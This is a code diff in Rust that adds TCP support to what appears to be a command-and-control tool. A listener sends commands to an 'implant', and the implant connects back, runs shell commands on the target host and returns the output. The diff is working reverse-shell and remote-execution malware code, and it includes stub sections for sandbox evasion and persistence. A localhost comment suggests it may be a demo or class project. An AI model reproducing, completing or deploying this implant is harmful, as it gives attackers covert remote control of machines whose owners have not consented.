@@ -80,6 +80,7 @@ fn listen_tcp(lsn: &mut Listener, address: SocketAddr, sb: &mut Arc<Mutex<Shared
                 // replace insides of .contains() with whatever string/key we are using to verify connection
                 if bytes != 0 && String::from_utf8_lossy(&buffer[..]).contains("order up") {
                     lsn.status = 2;
+                    stream.write("order recieved".as_bytes()).unwrap();
                     // switches to interact mode
                     interact_tcp(lsn, &mut stream, sb);
                     lsn.status = 1;
@@ -209,7 +210,90 @@ fn interact_udp(lsn: &mut Listener, target: SocketAddr, sb: &mut Arc<Mutex<Share
 
 fn interact_tcp(lsn: &mut Listener, stream: &mut TcpStream, sb: &mut Arc<Mutex<SharedBuffer>>) {
     println!("[+] Connection established by listener {}", lsn.id);
-    // TODO
+    let mut is_interacting: bool = false;
+    let mut memo: String = String::new();
+    loop {
+        // live interaction with client
+        if is_interacting {
+            // checks if client is terminating interaction with target_src
+            let cc: u8 = rcv_client_command(lsn, sb);
+            if cc == 6 {
+                is_interacting = false;
+                let code: u8 = 69;
+                let bytes = stream.write(&[code; 1]).unwrap();
+            }
+            // otherwise interact normally
+            else {
+                let mut sb_copy = sb.lock().unwrap();
+                if !vec_is_zero(&sb_copy.buff) && !String::from_utf8_lossy(&sb_copy.buff).to_string().eq(&memo){
+                    // send null byte to indicate no change in cc
+                    let code: u8 = 0;
+                    stream.write(&[code; 1]).unwrap();
+                    // now send input
+                    stream.write(&sb_copy.buff).unwrap();
+                    let mut output = [0; 2048];
+                    let mut bytes = match stream.read(&mut output) {
+                        Ok(b) => b,
+                        Err(e) => 0,
+                    };
+                    while bytes == 0 {
+                        bytes = match stream.read(&mut output) {
+                            Ok(b) => b,
+                            Err(e) => 0,
+                        };
+                    }
+                    sb_copy.buff = output.to_vec();
+                    memo = String::from_utf8_lossy(&sb_copy.buff).to_string();
+                }
+            }
+        }
+        else {
+            // check for client commands
+            let cc: u8 = rcv_client_command(lsn, sb);
+            match cc {
+                // go back to listening mode
+                3 => {
+                    // tell the implant to go dormant
+                    let code: u8 = 69;
+                    stream.write(&[code; 1]).unwrap();
+                    return;
+                },
+                // send a single line command to the implant to execute
+                4 => {
+                    let mut flag: bool = true;
+                    while flag {
+                        let mut sb_copy = sb.lock().unwrap();
+                        if !vec_is_zero(&sb_copy.buff) {
+                            let code: u8 = 1;
+                            stream.write(&[code; 1]).unwrap();
+                            stream.write(&sb_copy.buff).unwrap();
+                            let mut bytes = 0;
+                            let mut output = [0; 2048];
+                            while bytes == 0 {
+                                output = [0; 2048];
+                                bytes = match stream.read(&mut output) {
+                                        Ok(b) => b,
+                                        Err(e) => 0,
+                                };
+                            }
+                            sb_copy.buff = output.to_vec();
+                            flag = false;
+                        }
+                        else {
+                            thread::sleep(Duration::from_millis(10));
+                        }
+                    }
+                },
+                // tell implant to create a shell and begin interacting with it
+                5 => {
+                    is_interacting = true;
+                    let code: u8 = 2;
+                    stream.write(&[code; 1]).unwrap();
+                },
+                _u8 => todo!(),
+            }
+        }
+    }
 }
 
 // recieves a single byte from the client: the command code
@@ -280,7 +364,7 @@ pub fn decode_http(){
 /***************************/
 
 // creates a shell on the target
-pub fn shell(sock: &mut UdpSocket) {
+pub fn udp_shell(sock: &mut UdpSocket) {
     println!("Shell Started!");
     loop {
         // checks if shell is being terminated
@@ -304,13 +388,48 @@ pub fn shell(sock: &mut UdpSocket) {
                 break;
             }
         }
-        //Changed to include 1 because there was a bunch 
+        //Changed to include 1 because there was a bunch
         //being sent that didnt have anything
         let mut cmd = String::from_utf8_lossy(&buffer[..]).to_string();
         println!("{}", cmd);
         let cmd_out = execute_cmd(cmd);
         println!("{}", cmd_out);
         sock.send_to(cmd_out.as_bytes(), src);
+    }
+}
+
+// shell adapted for tcp
+pub fn tcp_shell(stream: &mut TcpStream) {
+    println!("Shell Started!");
+    loop {
+        // checks if shell is being terminated
+        let mut cc = [0; 1];
+        let bytes = match stream.read(&mut cc) {
+            Ok(b) => b,
+            Err(e) => 0,
+        };
+        if cc[0] == 69 {
+            break;
+        }
+        // Otherwise shell it up!
+        let mut buffer = [0;2048];
+        let mut bytes = 0;
+        loop {
+            bytes = match stream.read(&mut buffer) {
+                Ok(b) => b,
+                Err(e) => 0,
+            };
+            if bytes > 1 {
+                break;
+            }
+        }
+        //Changed to include 1 because there was a bunch
+        //being sent that didnt have anything
+        let mut cmd = String::from_utf8_lossy(&buffer[..]).to_string();
+        println!("{}", cmd);
+        let cmd_out = execute_cmd(cmd);
+        println!("{}", cmd_out);
+        stream.write(cmd_out.as_bytes()).unwrap();
     }
 }
 
@@ -417,7 +536,7 @@ fn imp_udp(lsn_addr: SocketAddr) {
                     }
                 },
                 // begin shell mode
-                2 => shell(&mut sock),
+                2 => udp_shell(&mut sock),
                 _u8 => todo!(),
             }
         }
@@ -426,7 +545,58 @@ fn imp_udp(lsn_addr: SocketAddr) {
 
 // main for a tcp implant
 fn imp_tcp(address: SocketAddr) {
+    // sandbox evasion
 
+    // persistence
+
+    // get public facing IP and pick a port, then initialize socket
+    // for sake of demos, stick to localhost
+    // let address = SocketAddr::from(([127, 0, 0, 1], 2973));
+    // let address = get_system_addr();
+    let mut sock = TcpStream::connect_timeout(&address, Duration::from_millis(10000)).unwrap();
+    sock.set_read_timeout(Some(Duration::from_millis(1000))).expect("set_read_timeout failed");
+    // try to connect back to listener
+    sock.write("order up".as_bytes());
+    let mut buffer = [0; 2048];
+    let mut bytes = 0;
+    loop {
+        bytes = match sock.read(&mut buffer) {
+            Ok(b) => b,
+            Err(e) => 0,
+        };
+        if bytes != 0 && String::from_utf8_lossy(&buffer[..]).contains("order recieved") {
+            break;
+        }
+    }
+
+    println!("Connected");
+
+    // once connected, listen for control code in a loop and use a match to determine what to do
+    loop {
+        let mut cc = [0; 1];
+        let bytes = match sock.read(&mut cc) {
+            Ok(b) => b,
+            Err(e) => 0,
+        };
+        if bytes != 0 {
+            match cc[0] {
+                // execute single line cmd
+                1 => {
+                    buffer = [0; 2048];
+                    let bytes = match sock.read(&mut buffer) {
+                        Ok(b) => b,
+                        Err(e) => 0,
+                    };
+                    if bytes != 0 {
+                        let cmd_res: String = execute_cmd(String::from_utf8_lossy(&buffer[..]).as_ref().to_string());
+                    }
+                },
+                // begin shell mode
+                2 => tcp_shell(&mut sock),
+                _u8 => todo!(),
+            }
+        }
+    }
 }
 
 
